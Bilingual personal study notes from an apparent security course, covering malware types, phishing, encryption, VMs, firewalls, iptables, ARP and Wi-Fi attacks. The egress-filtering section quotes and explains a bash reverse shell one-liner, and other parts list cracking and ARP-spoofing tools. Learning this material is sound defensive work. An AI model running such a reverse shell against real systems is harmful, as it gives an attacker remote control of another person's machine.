# Security course - volume 1
## Goal
* fundamental building block of security & privacy
* online threat & vulnerability (hacker, tracker, malware, zero day, exploit kits)
* threat modeling & risk assessment
* determine personal threat and adversaries
* set up virtual environment (virtual box, VMware) or host operating sys (windows, linux, kali)
* encryption (symmetric/asymmetric algo) (hash, S-H, SSL, TLS)
* social engineering attack (phishing, smishing, scams, cons)
* isolation and compartmentalization effectively

CIA
* C: Confidentiality 保密性:保證資產不會揭露給任何人
* I: Integrity       完整性: 資產與內容不會被竄改替換
* A: Availability    可用性: 存取資產的系統可用並功能正確

三者平衡，某項增加可能意味著需要降地其中另一者。

* The six atomic elements of information or the Parkerian Hexad:  
integrity, authenticity, Confidentiality, Availability, utility, "possession or Control"

Non-repudiation 不可否認性。訊息發送方或接收方不能否認未接到訊息
Availability 能認證使用者或系統的身分

* 將內容加密(encryption)可以提供Confidentiality。
* Hash，可提供authenticity, Non-repudiation, integrity。
* encrypted and digitally signed. confidentiality, authentication, non repudiation and integrity.

## SABSA
SABSA stands for the Sherwood Applied Business Security Architecture.
https://sabsa.org/white-paper-requests/
![alt text](SABSA.webp "SABSA")


# defense
* Prevent:  
    encryption and keeping keys, password safe.
* Detect:  
    trap(canary), detect threat from hacker
* recover:
    like backup

The principle is what you cannot prevent.  
You detect what you cannot detect you recover from.

![alt text](defense.PNG "defense in depth")

## Zero trust model:  
Trust nothing. Trust no one.

e.g dropbox  
Not trust they will not get hacked, not view your files, not lose or change files.  
### distributed trust:
Encrypt your files, or use the service to encrypt the files.
Client side with a decrypt key only client have.  
This way to distribute the trust to the alternative backup.

### Zero knowledge
The provider literally has zero knowledge about what it is that they are hosting

## Security bug and vulnerability
* exploit kits resources:  
X http://executemalware.com/?page_id=320  
https://www.exploit-db.com/

## Malware type
* Macro virus - (like VBS)  platform independent
* Stealth Virus - hides the modifications (攔截防毒軟體對OS的call for hide)
* polymorphic vurus - (have no parts that remain identical between infections)
* self-garbling virus - (修改自身使防毒的predefined antivirus signatures不吻合)
* bots % zombies
* Trojan horse
* rootkit (hide in OS - hide its existence completely)
* firmware rootkit (worst of all -(formating drive, reinstall OS won't shift it))
* Ransomware
* Malvertising:  
 These scripts point to other scripts which download all the scripts from another location and repeat this process a few times until finally malware is presented to the user of the website.
* Drive-by attack (simply visiting a website that contains code to exploit your machine)
* spyware
* adware (forces advertisement) (Lenovo)
* scareware
---
### Phishing   
  * link manipulation:   
    * subdomains and misspelt domains.
    ```
    http://www.google.com.stationx.net
    // stationx.net 才是真實網域 (Domain Name) 
    http://www.rnicrosoft.com
    ```
    ```
    URL :
    `subdomain.domain.tld`

    Subdomain:  prefix of main domain. Such as "blog," "shop," "support,"

    Domain Name: It often reflects the name of the organization.  "www.example.com," "example" is the domain name.

    Top-Level Domain (TLD): common TLDs include ".com," ".org,"

    e.g. http://www.google.com.stationx.net
    `www.google.com.` = Subdomain
    `stationx.net` = Domain Name
    ```
    ![alt text](phishinglink.PNG "phishinglink")

    High level domain (to the real domain ' which direct to')
    ![alt text](HVD.PNG "HVD")
    
    * IDN homograph attack
    ```
    http://www.g00gle.com
    ```
    * Hidden URLs
    Hidden URL as a html
      ![alt text](hiddenURL.PNG "hiddenURL")
    but the real URL is in `<a href>`
    * 如果將滑鼠懸停沒有顯示出URL(被JS影藏)，則要開啟raw html
    * 若網站有漏洞被開發，則真的URL可能經過open redirect, cross-site scripting, cross-site request forgery攻擊來導到fake URL
    ![alt text](weburlcsf_vul.PNG "weburlcsf_vul")
    若網站URL被嵌入惡意script則代表malisious user 可以竊取cookie。  
    真實網站不應該接收request中帶有自己的script。造假的URL site可以利用此漏洞吸引受害者。

## Social engineering attacks
假抽獎，獎品，詐騙 (fake prizes, sweepstakes, free gifts, lottery scams.) fake bill, fake FB friend request.

## CPU hijackers
Crypto Mining Malware/Cryptojackers 
No coin - 加密貨幣阻擋器 - web page

## Dark net 
Any darknet that is publicly accessible,such as Tor could be indexed for searching.

tool to maintain anonymity and is in some sense to maintain security. 

* snakeRat.  
So was looking for files that's on the victim machine looking at the desktop, can access the webcam, can steal or harvest passwords, bank account details, personal information, etc..

* spy stuff
monkeycakebdar : 假的sim card向駭客發送隱私信息 (what you're doing and your location and whatever else or their information that they desire.)


# Encryption

## Symmetric Encryption
use ono key
* Data Encryption Standard (DES)
* Triple-DES (3DES)
* blowfish
* RC4
* RC5
* RC6
* AES

### Attack
brute force attack, dictionary attack. 用以破解人類常用密碼. Not easy, but work on weak password.


## Asymmetric Encryption
use two key (public and private)

* Rivest-Shamir-Adleman (RSA)
* Elliptic curve cryptosystem (ECC) 橢圓曲線
* Diffie-Hellamn (Forward Secrecy)
* El-Gamal

公鑰加密 私鑰簽章 (public key for encryption, private for signature)

## hash functions
one to one.
* MD2, MD4, MD5 (don't use)
* HAVAL
* SHA, SHA-256, SHA-387, SHA-512 (use over SHA-256)
* Tiger 

Hash tool: TrueCrypt -> VeraCrypt 
hash MAC (check pre-agreed key consistency)

## digital signature

## SSL & TLS
https://en.wikipedia.org/wiki/Transport_Layer_Security  
don't use SSL (old).  
use TLS over 1.2 

SSL 2.0	1995	Deprecated in 2011 (RFC 6176)  
SSL 3.0	1996	Deprecated in 2015 (RFC 7568)  
TLS 1.0	1999	Deprecated in 2021 (RFC 8996)[20][21][22]  
TLS 1.1	2006	Deprecated in 2021 (RFC 8996)[20][21][22]  
TLS 1.2	2008	In use since 2008[23][24]  
TLS 1.3	2018	In use since 2018[24][25]  

## Sniffers
* hacker 使用實體網路或ｗｉｆｉ攔截使用者封包來做到:  
 ARP spoofing or poisoning.  
fake router 可能竄改或執行strips SSL ，受害者會被竊取帳號密碼
https://www.irongeek.com/i.php?page=security/AQuickIntrotoSniffers

使用tunnel or encrypted tunnel可以避免strips SSL，因傳輸機制不同。可以使用SSH(Secure Shell Protocol)來完成tunnel。for example, you can use VPN technology like IP SEQ

檢測工具:sniffdet   檢測附近是否有人在Sniff

server side prevents:  
They can enable something called HHS, RTS or strict transport security, which uses a special response header to tell the browser to only accept HTTPS traffic.  
HTTP strict transport security (HSTS)

Virtual LAN (VLANs) prevents traffic going from one area of the network to another area of the network using a switch and special tags.


## http & https
http 是明文。當網頁URL呈現Https則會與server開始執行SSL

Https 在client hello 階段會揭露Server Name Indication(SNI)。SNI是個extension ，client用來指名要連接的hostname，藉此給予Client多個 `certificates` on the `same IP address` and `TCP port number` and
hence `allow multiple secure HTTPs websites` or any other service over TLS to be secured by the same。但在之後就會經過加密

## 簽章
X.509 是最常用的簽章format
![alt text](webcert.PNG "webcert")
![alt text](webcert2.PNG "webcert")
common Name: 證書頒發的對象
organization: 頒發證書的機構
fingerprint 是這個證書內容的唯一編號由hash產出
上方tag的detail可以找到 public key。
這邊的RSA public key 去解碼 簽章 出來的SHA 256 必須與 證書上其餘部分計算的實際SHA 256一致。

在certificate Hierachy中
root CA 是OS (microsoft)所承認的證書，其在作業系統中有完整的列表包含它。

## https & certificate
https依賴於證書驗證網站的真實與public key是否屬於該站。

證書鏈生態系統是脆弱的，斷鏈是不可避免的，當站點存在漏洞使虛假的證書被發布，所有人都會相信假證書，訊息會洩漏給不安全的機構或server。

prevent:
* 刪除瀏覽器中接受的證書，95%的網站只需要少數的權威證書認證機構。
* 鎖定證書，如銀行APP中止需要銀行發行的證書，即APP只接受銀行證書即可。
* 使用VPN，將訊息模糊，儘管內容洩漏給不安全的網站，洩漏的訊息無法與本人關聯。
* 使用VPN訪問值得信賴的代理伺服器，繞過不受信任的中繼站。

## End to End Encryption (E2EE)
發送方加密僅由接收方解密。  
PGP SSL/TLS OTR ZRTP
中繼端或開發方也無法接露加密訊息。

## Steganography (隱寫術)
額外的訊息被隱藏在資料中，資料可能是圖片、影片。訊息並沒有加密只是隱藏。  
經過壓縮會損毀隱藏訊息，例如上傳youtube, 壓縮檔案。  
想要使用時，先對載體resize可以避免原始檔被google到來發現載體有變動過(可能藏有額外訊息)  
e.g. openPuff, spammimic.com

---
安全領域中，加密是有效的手段，因為有效攻擊者會試圖繞過(不使用暴力破解)，例如使用釣魚或社會工程法，這是安全鏈中最弱的一環。  
OPSEC or operational security.  
注意最薄弱的一環，使用了強力的加密法，但使用糟糕的密碼或使用沒有Update or patch的瀏覽器或系統，這樣跟沒做一樣不安全。

## VM
OS Image webSite: www.osboxes.org。用來測試，不要用於真實環境除非信任他  
VM environment tool: VMware, virtual box  
OS: kali, windows, debian, linux  

### network 
bridge mode: directly to the physical network.
NAT: host as a gateway machine, won't be able to see the network traffic.


## severity of security bugs and vulnerabilit 
CVE Detail:  
security vulnerability database: https://www.cvedetails.com/  
Windows在資料庫中有相較其他有較多漏洞發現，不代表其他較安全，可能是調查率較低。各資料庫中的漏洞紀錄會有誤差。    
各個漏洞資料庫對單一漏洞可能有不同分類，因技術細節、專注領域不同。  


#### windows tracking
Microsoft會追蹤用戶的log將某些訊息傳回phone home。

https://www.github.com/10se1ucgo/DisableWinTracking  
opensource , written in python。用於停用tracking服務功能的工具。
executable version對每個項目有說明。  
Diagnostics tracking service, WHAP push message routing service  
Block tracking domain, tracking IP. (by modify "system32/drivers/etc/hosts" setting by hardcoded) like modify network file setting in linux  

以下其他工具，要確定信任這些工具，opensource可以驗證程式安全與完整性。使用前先備份系統  
* Destory windows 10 spying
* Disable windows 10 tracking
* DoNotSpy10 (close source)
* win10privacyfix
* W10privacy



## general use operating system that has a particular focus on security and privacy
* Debian 
* Arch Linux  
    獨立開發的linux，使用Packman(自己開發的軟體管理器確保最新的更新)
* open BSD. (develop OpenSSH)

Parabola:完全開源的Arch，Mujuru: 易用版的Arch。


## Hardcore  security focused OS (top priority)
* Qubes OS  
Cube's own security is implemented through isolation and compartmentalization using virtualization  
negative: hard to get some hardware working (hardware compatibility)
* subgraph OS
* Tricycle OS.
* PureOS

## hardcore anonymity focused OS
* Tails OS  
  Tails is specifically resistant to local forensic examination, so no one will know what you've actually been doing on it.  

* Whonix OS
Whonix通過隔離實現安全性, Whonix特別關注匿名性和防止Tor網絡洩漏｡ 所以這對安全性､ 隱私性和匿名性都有好處｡不過, 這並不能減輕當地法醫(local forensic examination)的檢查｡ 所以你所做的會留在平台上, 不像Tails, 它會抹去你在本地做的事情｡

## penetration testing and ethical hacking  OS 
* Kali Linux OS
* Parrot Security OS (cloud pin testing and Iot security in mind)  
other:  
* BlackArch Linux 
* BackBox Linux
* Pentoo


## Mobile OS
* IOS (good security)
* Android
* Lineage OS
* Sailfish OS
* Replicant OS
* OmniROM OS
* MicroG OS

## updates & patching
1. directly interface with Internet - Browsers (Opera, Edge, Firefox, chrome), brower extension (Java, flash, silverlight)m email application (outlook, Thunderbird)
2. Applications that use, play, view of downloade file - Windows Media player, adobe reader, image viewer, Word, excel
3. Operating System

### auto tool to check update for most app (MS)
* Secunia PSI

* Appupdater
* FileHippo App Manager
* Ninite 
* software update Monitor (SUMo lite)
* Dumo (driver)


## Debain patching
https://www.debain.org/security

dpkg: main package manager for Debain  
e.g. $dpkg -i filename.deb

apt: command line front-end for DPKG  
e.g. $sudo apt-get install nmap

aptitude: front-end for the advanced packaging tool from apt (similar to apt-get)  
e.g. $sudo aptitude install zenmap

### Software updates, security updates:  
$apt-get update  && apt-get dist-upgrade

apt-get (synchronize the package index files from their source.)  
source path: $cat /etc/apt/source.list

Apt-get update tells apt-get if there had been any package changes.

---
### apt-get upgrade
`apt-get upgrade` instead of `apt-get dist-upgrade`.

upgrade: actually install the newest versions of all packages。此會更新最重要的package，但可能犧牲不太重要的更新

apt-get dist-upgrade: it also intelligently handles changing dependencies with new versions of packages. Dist-upgrade command `may remove some packages`.

#### GUI: `Synaptic package Manager`

#### Auto upgrade packeage tool: `unattended-upgrades`


# social media - identiy verifucation and registration
Guerrilla Mail: a disposiable temporary mail address.  
BugMeNot: give shared account and password fro some service.

(disposable/temporary email address)
mailnator.com
guerrillamail.com
mystrashmail.com
mailexpire.com
tempinbox.com
dispostable.com

(temporary email)
anonbox.net
freemail.ms
10minutemail.com
getairmail.com
dontmail.com

### www.receive-sms-online.info
give you phone number to get SMS message  
use for non private but anonymous


## behavior security for social threat
1. behavioral change  
    1. If you didn't request it - don't click on it
    2. Never download and run any file you don't 100% trust
    3. Never enter sensitive information after following a link or popup (always get to offical website URL)
    4. [Validate the link](#phishing) - phishing section  
    5. minimise personal information disclose
    6. Validate the sender  
        If company email address is like Hotmail or Gmail, then it’s definitely fake.  Companies can afford their own domain names.
    7. vishing & SMShing : 在電話或簡訊上不提供訊息，除非確認過安全與公司行號

* You can use https://whois.domaintools.com to check the URL.  If a Admin Name: perfect privacy or hidden some info then it maybe unsafe.

* There are websites that can check whether a URL is safe or not. But not trust 100%  

* You can use total virus to check if the attachment is a known malware 
by forwarding the email to scan@virustotal.com. https://www.virustotal.com

Never ever run any of these, unless you are 100% sure that you trust the source.
![alt text](fileExtensions.PNG "fileExtensions")

Document extensions that also should be avoided.  
These can contain executable macro viruses,
![alt text](fileDocExtensions.PNG "fileExtensions")

probably safe.but it is possible that these could exploit a flaw
if the software you use to view them has a vulnerability, but it’s quite unlikely.
![alt text](fileMediaExtensions.PNG "fileExtensions")





2. technical security control (sandbox)
    1. The first is use an good email provider
    2. credit crad freeze and moniter. bank service
    3. view email in text instead of html. 
    4. email use service of hosting files instead of attachments. (使用安全檔案託管取代附加檔案)
    5. Using `OpenPGP` signatures to validate the sender



# virtual isolarion
NAS drive 隔離: 使用NAS隔離資料。
    根據安全層級分層，保密，機密，最高機密。各層級使用不同虛擬drive，不需要時可以unmount。在unmount期間即使有勒索軟體也影響不到unmount drive。
    drive 可是使用 hidden encrypted volumes 加密磁區。在與其網路溝通時可以使用TLS加密溝通，一組會話使用一組密鑰

使用可移植式軟體，可以食刪除與移動所提供的隱蔽性是可以考慮的。單獨的安全域，單獨的配置。
例如表面使用一般瀏覽器，可移植瀏覽器則可以加上加密。或將可移植瀏覽器存放在雲端同步，可以避免本地查。

為了實現email隔離，可以使用第三方郵件(ghostmail)，但前提是信任此第三方服務，這樣提升了安全性，但降低了匿名性。

雲端瀏覽器:Authentic8, Maxthon's clould browser, AirGap of Spikes, spoon.net
避免網路感染本地。但不適合隱私與匿名

使用遠端服務，遠端桌面，citrix, teamViewer, SSH, VNC, XenDesktop

### nested ssh connection tunnel
經過中介點的ssh connection  
```
ssh -t -t -v -L 8080:localhost:9932 root@demo.stationx.net ssh -t -D 9932 root@demo2.stationx.net

8080:localhost:9932 -> "local port":"remote server":"remote port"
```

## sandbox
chromium, firefox have sandbox but may be broken by hack, additioal sandbox is recommand.

    e.g.
    Bufferzone
    shadowdefender
    deepfreeze
    sandboxie
    ...
(maybe out of time)  

linux sandbox:

    appArmor (other security framework: SELinux, Grsecurity)
    sandfox
    linux sandbox (linux command)
    firejail (light  sandbox)

## virtual machine
### VM

Type II hosted: 建立於OS之上  
virtualBox: 有 snapshots 功能，能快速永久備份並用於還原

Type I hosted: 建立於硬體之上，沒有OS，因沒有OS，惡意軟體可能失去攻擊目標
native/bare metal  

    VMware ESX/ESXi
    Oracle VM server
    Microsoft HyperV
    XenServer

VM 若配置不當仍舊有風險，硬體共享(MIC, CD, serial console...etc)，CPU timing channal, 或是網路橋接模式。

### docker
降低系統需求共用 shared operating system，不像其他VM各自依賴模擬的guest OS  
Solaris' Zones 同是個相當工作軟體的工具

### Virtual Appliance.
TurnKeyLinux: TurnKeylinux.org 

## Whonix
Whonix is a free open source operating system, based on Debian.  
Whonix implements security through isolation,
並專注在匿名隱私與安全，使用TOR匿名網路，幫助隱藏網路服務商提供的IP，避免ISP spying on you，避免網路或惡意軟體辨識出使用者的身分，避免網路審查

arm:  a status monitor for TOR and gatrway. resource usage, bandwidth, CPU.  
like $top for Tor 

Timesync - need accurate time or it will fail.  
Whonix use SDW date. unauthenticated NTP is a potential deanonymizer.  
don't use the internet until time sync has been successful.

whonix gateway
whonix workstation

## Qubes OS
uses a microkernel,  isolation enforcing code reducing the attack surface.  
Qubes enforces security domains through different virtual machines.  

Xen is the bare metal hypervisor.
The host domain or Dom0 is the interface or GUI to everything else.
Dom0 isn't reachable for an attackeras there is no network connection to it.

Qubes 將許多作業系統層次的microkernel作為VM隔離，避免攻擊者感染，當攻擊者攻陷其中一者(netVM)，要攻擊其他部分需要升級或其他攻擊手段。

軟體層面可以同時開啟銀行頁面，與untrust網頁頁面，Qubes可以將兩者都作為VM在不同的domain下不互相影響。

#### windows/app in Qubes
these are just separate windows within an operating system,
but in fact they are entire separate operating systems
as part of a virtual machine
that are isolated from each other by Xen and Qubes.

#### 缺點
硬體支援不夠，CPU需要完整的虛擬化功能  
https://www.qubes-os.org/hcl/

## Shodan 
Think of Shodan as a search engine that searches for vulnerable devices on the internet.

## hashcat
hash attack tool

## corkscrew
a tool for hot tunneling SSH through HTTP proxies


# email
1. web browser email. e.g. gmail, yahoo  

    access via HTTPS,port 443 (SSL/TLS),
    Two Factor Authentication.  
    Emails are only stored on the server.

2. email client. e.g. Thunderbird, or Claws, or Outlook,

    IMAP port 143 (unencrypted)  -  synced on client & server  
    POP port 110 (unencrypted)  -  stored on client only  
    IMAP port 993 (SSL/TLS encrypted)  
    POP3 port 995 (SSL/TLS encrypted)  -  download from server and delete from server  

### protocol
SMTP port 25 (unencrypt)  
STARTTLS port 587 (SSL/TLS encrypted)  -susceptible to man-in-the middle attacks.  
SMTP port 465 (SSL/TLS encrypted)  

kali - SSLscan  

nslookup (doing for DNS lookup)
$nslookup -type=mx gmail.com  (search for ip address)

Netcat (能夠讀寫TCP/UDP於網路連接的工具)
$nc gmail-smtp-in.l.google.com 25  (write smtp cmd text-based email to google smtp)

$netstat -tuln
read which port/protocol is listening and what port/protocol. 

DNS port 53
SSH port 22

# home router
woindows: $route print  
MacOs: $route -n get default  
linux: $sudo route -n  

gateway IP is the one of the closest router.  Default gateway is also called the default router.

each port hosts a different service.(e.g. 22 is SSH remote login)

* UPnP(Universal Plug and Play) recommend block by firewall. Upnp自動歷遍LAN內所有裝置並提供連接服務.

### basic network

一般情況外部網路無法直接連到內部設備，因為NAT(Network Address translation)。NAT會隱藏後面內部網路的IP，由NAT來轉換IP遞送封包。
port forward: 在router中能指定內部網路特定device的IP與port直接接受外部網路。

現代router包含多種複合功能，switch, firewall, router, wireless access point.  
switch: keep a table of ethernet MAC address called MAC table.  他使用獨一的MAC address連接裝置作用於data link layer連接層。當data到了local network，IP將不再被使用是使用MAC address來找到裝置位置。IP使用在網際網路(internet)上。

switch提供較好的安全對比於hubs， called isolated collision domains。
you can't sniff the traffic on the network with a switch because traffic only gets forwarded to the correct physical LAN port based on the MAC address.

switch會尋找對應要送的device根據MAC address，但hubs是會broadcast到全部devices.

"IP tables" is the software commonly used as the Firewall (layer 3, 4)

另外也有layer 7 firewall, "deep packet inspection Firewall", "proxy Firewall" or "application Firewall"，但這種不常見於router中。

router 的作用在於連接network到另一個network根據 IP routing table (e.g. LAN to the WAN) (layer 3)

Modems, they modulate and de modulate the signal so it can be passed onto the local loop of your network carrier. (layer 1)

bridge (forwards broadcast traffic but not collisions.) (layer two)

Routers 能提供DHCP來分配IP給之下的devices (DHCP is protocol)  (NAT is process to rewrite ip address)

DNS resolve "domain names" into IP addresses。

當使用 NAT 時外部網路無法看到內部，但有設定配置port forwarding時，port forwarding可以將設定的服務，packet送到指定的device port。

NAT: translating private IP addresses used within a local network into a single public IP address that is visible on the external network.  
轉換私有IP於本地網路到公共對外可見IP

NAPT（Network Address Port Translation） or PAT (Port Address Translation) :   
PAT, also called NAT Overload, is a specific type of NAT. It extends NAT by not only translating IP addresses but also port numbers. PAT uses different port numbers on the public IP address to route traffic to the correct device within the local network.  
NAT的擴充體，不只轉換IP，同時將特定data stream給限定port numbers對應的private IP。 


## exrernal Vulnerability scan: port scanning

kail: arp-scan

https://pentest-tolls.com/network-vulnerability-scanning/tcp-port-scanner-online-nmap 
tool: nmap  
Steve Gibson's ShieldsUP  
https://techmonkeys.co.uk/hackckeck/index.php
Qualys FreeScan (recommend)


## Internal Vulnerability scan
check DHCP  
Whindows: ipconfig /all
linux: network manager / $cat /var/log/syslog | grep DHCP

scanning:
nmap/zenmap(GUI for nmap)

`$nmap -T4 -F X.X.X.0/24` (0 for "device IP/host ip" - X.X.X for "network ip")  
And T is for fast execution and F is for few ports.

scan tool:  
Windows: SuperScan
mobile: Fing - Network tools


metasploitable: 故意存在漏洞的的虛擬機目標，特別保留漏洞用於訓練目的或POC於攻擊與威脅
https://sourceforge.net/projects/matasploitable/files/Metasploitable2

OWASP WebGoat:  
deliberately insecure web application maintained by OWASP  

DVWA (Damn Vulnerable Web Application):
web application  

Metasploit Unleashed (MSFU):  
Metasploit Unleashed is a comprehensive resource for learning about the Metasploit penetration testing framework  

PentesterLab:  
PentesterLab offers a platform with hands-on exercises and vulnerable environments  

Hack The Box (HTB):
HTB is an online platform that provides virtual labs with intentionally vulnerable machines


## vulnerability scanner
Kali application:  OpenVAS
當開起 OpenVAS start 後會啟用local 127.0.0.1:9390-9392。可從web輸入IP進入(自簽證書警告可忽略)。  
帳號密碼可使用 `$openvasmd --create-user=admin --role-Admin`
最快開始使用在WEB的index tag 選 wizard - Advanced Task Wizard  
scan management 可找到掃描報告

https://openvas.org/index.html

Another tool (OpenVAS is based on an older version of Nessus):  
NessusHome  
https://www.tenable.com/products/nessus-home


Qualys和OpenVAS 是成熟的商業產品，openvas不是。在給予SSH權限掃描漏洞時可能擾亂設備配置。
通常情況下會希望禁止SSH到達ROOT權限。

# Router firmware
https://en.wikipedia.org/wiki/List_of_router_firmware_projects  

找到想要用的open source firmware。使用router web頁面(manufacturer提供)或console來update firmware。  
更新firmware務必小心，確認firmware可用。造成損毀無法求償。先檢查whether firmware support.
e.g. OpenWRT(good), Gargoyle, DD-WRT(good), LibreWRT(libreCMC)-(handful of devices).

customer firmware - real time network monitoring, VLANs network isolation, open VPN, client open VPN server.  
It doesn't support as many routers, but it does support most of the common home routers.
These can use SSH login router.


## firewall
firewall : pfSense  

host-based, network-based and virtual firewalls.
防火牆用於拒絕流量根據定的rule (called `access control list`). 大部分作用於 layer 3/4 (network/transport layer) 根據 port, protocol, address.

advence firewall  
advanced firewalls work at the application layer to do deep packet inspection or dpi.
Generally dedicated hardware firewalls.
擁有protocol and port-based rules. 例如允許HTTPS on 443 再加上 封包檢查
![alt text](firewallRule.PNG "firewallRule")
this example, look at the TLS handshake to verify it is HTTPS,
確定這包是HTTPS，而不是SSH或TOR試圖潛行過此443 port。
非application layer的防火牆無法做到。

host-based firewall.  代表主機OS自帶的防火牆，windows firewall, linux ip table。
對於家用router，因為有NAT外部流量不會直接溝通到host devices，(但在公開WIFI時NAT不保證保護，此時host-based firewall就很重要)，預設上host-based firewall 應該拒絕所有外部流量。

#### Egress filtering
防火牆也能用於阻擋出站連接(outbound connections)，避免VPN或malware洩漏或控制。
對於家用網路Egress filtering很用有處，惡意軟體在操控或洩漏需要RAT(remote access Trojan-遠端遙控)/reverse shell/reverse connection，

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  
reverse shell: 
$bash -i >& /dev/tcp/10.0.0.1/8080 0>&1  
* bash -i : interactive Bash shell, allowing input and output interactions with the user  
* \>& /dev/tcp/10.0.0.1/8080 : redirects both the standard output (stdout) and standard error (stderr) streams to a TCP connection  (這邊的&代表stdout and stderr)
* 0>&1 :  This part redirects the standard input (stdin) stream to the standard output stream。代表input的內容會是stdout，stdout同時是tcp來的內容。

## Dynamic packet filtering 
Dynamic packet filtering (Dynamic packet filtering)
所有現代防火牆皆使用，使用後只需允許出站流量(outbound)，不需要設定inbound rule。
例如流量來源的port, address, session會被防火牆紀錄，當session結束或是port, address不對應出站流量會被阻擋。

### Third party window firewall controll app
https://www.binisoft.org  WFC(windows firewall control)

### party window firewall
GlassWire  
TinyWall  
卡巴斯基


## linux  firewall

### IP table

show IP table/packet filtering  
$iptables -L  
$iptables -L --line-number -n

if not installed:  
$apt-get install iptables 

 ![alt text](iptables.PNG "iptables")

 Chain INPUT:  
 能接受外部流量輸入，例如，希望人們可以PING到這台電腦，則在這添加ping的input rule

 Chain forward:  
 也是用於inbound connection，但是專門對於轉發到另一個裝置而不是這個裝置。
 除非機器是NAT或是一個router，否則很少使用此規則。或是特殊執行SSL stripping才會用到。

 Chain output:  
 對外流出的流量，例如希望瀏覽網路，則開啟port 80、443、53。

default policy: DROP  
在Chain右邊的policy寫DROP，代表默認行為，當所有規則都不與下列規則吻合，則會根據DROP規則斷開連結。
有其他policy可選，如ACCEPT

$iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT  
-A 添加 rule -m 添加module state 能夠檢查封包狀態。增加Dynamic packet filtering對相關(relate)與新建立(ESTABLISHED)的連線。
-i interface, -j jump switch(jump to the target action for packets matching that rule.)  
-o switch to interface (like eth0)

$iptables -A OUTPUT -o eth0 -p udp --dport 53 -j ACCEPT  
(accept DNS)

$iptables -A OUTPUT -o eth0 -p tcp --dport 80 -m state --state NEW -j ACCEPT  

$iptables -D OUTPUT 5 (delete line 5 of output)

$iptables -F  (Flush all/clear all rule)  
$iptables -X  (delete any non default rule)  

$ip6tables -L  (ipv6)

https://tech.meetrp.com/blog/iptables-personal-firewall-to-pretect-my-laptop/  
https://github.com/meetrp/personalfirewall/

### tool for linux firewall

* ufw  
$apt-get install ufw  

* shorewall

* GUFW  
graphical interface 

* nftables
new development

* DD-WET, fwbuilder, pfSense


## ARP
ARP: parse IP to MAC address  

ARP沒有驗證機制，任何人都可以宣稱MAC，arp本身是zero security. 假冒arp工具:  
Kail arp tool: arpsppof, ethercap   
Windows arp tool: cain and able

ARP Info: https://www.irongeek.com/i.php?page-security/AQuickIntrotoSniffers  

tool: TuxCut, Netcut for dos (denial-of-service attack) attack using ARP protocol  


防範:  
VPN, switch port security, switch DHCP Snooping. IEEE 802.1X (裝置需要驗證連線的標準)

WEP 有嚴重安全問題，密碼長度，加密算法，RC4破解，IV無效等問題，非常易破  

WPA 有研究表明易受packet injection attacks，在其使用的TKIP加密算法造成hijack TCP connections.  (Practical attacks against WEP and WPA, Martin Beck, TU-Dresden, Germeny 2008) avoid using TKIP  

WPA2 : stanard IEEE 802.11i  
CCMP, which is Counter Cipher Modem (Block Chaining Message Authentication Code Protocol,) to instead TKIP .  
CCMP is an AES based encryption counter mode mechanism (CTR), and it is stronger

WPA2 personal mode - pre-shared key : 產生key藉由router password，不是很好，可以手動調正

WPA2 Enterprise: 使用multiple passwords. extensible authentication protocol (EAP) 設定上較為困難  (dual certificate authentication on client and server)

`disable WPS` setup:  definitely should not be enabled. That is a serious security vulnerability.

RADIUS authentication server (RADIUS, Remote Authentication Dial In User Service) 需要驗證的server term.


Dictionary, Brute-force attacks 對於長度短不複雜的password(like pre-shared key) 在WPA WPA2 仍然可能有效 (`rainbow table`)

Kail password cracker:  
aircrack-ng  
cowpetty (offline dictionary attack against WPA and WPA2 using the PSK-based authentication)  
Reaver (brute force attack against the wifi protected setup or WPS)  
Fern WIFI cracker (GUI tool)


### Network detect tool
airodump-ng (This will detect access points and also list the connected clients)

Network traffic (protocol analyzers) tool:  
wireshark  
TCPdump  
Tshark


### tcpdump
cheatsheet:  
https://packetlife.net/media/library/12/tcpdump.pdf

https://packetlife.net/media

### wireshark

https://wiki.wireshark.org/DisplayFilters

cheatsheet:  
https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf

#### network monitoring 

windows:  
WinPcap:  remote network analysis with wireshark

Network Security Toolkit (NST) - NST 22:  bunch of network tools

NetworkMiner: free protocol analyzer

windows:  
Networx:  network usage/bandwith


## burp suite 
penetraction test, intercept packet
![alt text](burpSuite.PNG "burpSuite")

## fire bug
web page monitor, can read cookie

Firebug – SecTools Top Network Security Tools
SecTools
https://sectools.org › tool › firebug
Firebug is an add-on for Firefox that provides access to browser internals. It features live editing of HTML and CSS, a DOM viewer, and a JavaScript ...

### tracking
http referer tracking:  
連入網站後，該網站包含第三方內容如廣告，廣告商成追蹤本地第一方連入者，第三方可能還包含四方，五方內容。
email 中也可能包含。
conversion pixels or audience segmentation pixels. 不可見的pixel圖檔，可由http referer追蹤到都到郵件的人，如果email會自動開啟圖片

cookie:  作為紀錄seesion的token，為網站記錄使用者ID，若ID不夠random並沒有https加密，man-in-middle有可能重現/仿冒該session

### anonymous search engine 
https://www.startpage.com/

https://www.duckduckgo.com/  //can work on TOR/orion

https://search.disconnect.me/

但如果網站上有GOOGLE code, script or push google button. google can still track you.

### SSL sewsite test
SSLscan, ssllabs: can check ssl encryption on connection


### penetration testing tool
#### browser hack 
* metasploit  
* BeEF - The Browser Exploitation Framework Project


### protection extension
* uBlock origin  (voluntary development)
* uMatrix  

#
* disconnect.me
* ghostery
#
* RequestPolicy (blocks all cross-site requests unless you allow them.)
* privacy badger (禁止未經同意的第三方流量，第三方廣告，但允許第一方廣告)

* NoScript:  
protects you against things like cross site scripting attacks 
and Clickjacking attacks.

* virustotal:  
URL check

IOS: 
* Purify : ad filtering

### 避免tracking and cookie leak
一次性VM:  
So no data is ever permanently stored when you are browsing.
Taos, Nopix, Live, Debian, Whoniks, disposable VMs。

VM snapshoot

### cookie and register clearers

supercookie or evercookie 無法在標準的瀏覽器移除cookie選項刪除

CCleaner  
BleachBit  
`winapp2.com` :
This contains 2,000 plus extra software signatures
for cleaning evidence, including Firefox and other browsers.

cookie-manger  (firefox add-on)  
self-destructing-cookie
decentraleyes (避免用戶直接連接第三方或分散式CDN內容追蹤，CND內容會先進到decentraleyes.org)


### http referrer tracking
RefControl  



## password length 
128-bit encryption use 22 characters + (not future proof)
256-bit encryption use 43 characters + (good)
512-bit encryption use 86 characters + (vert good, slower)

don't use passwords less than 20

https://github.com/dropbox/zxcvbn  : 密碼pattern強度測試


### live OS
create bootable USB/SD card

Tails  
Knoppix  
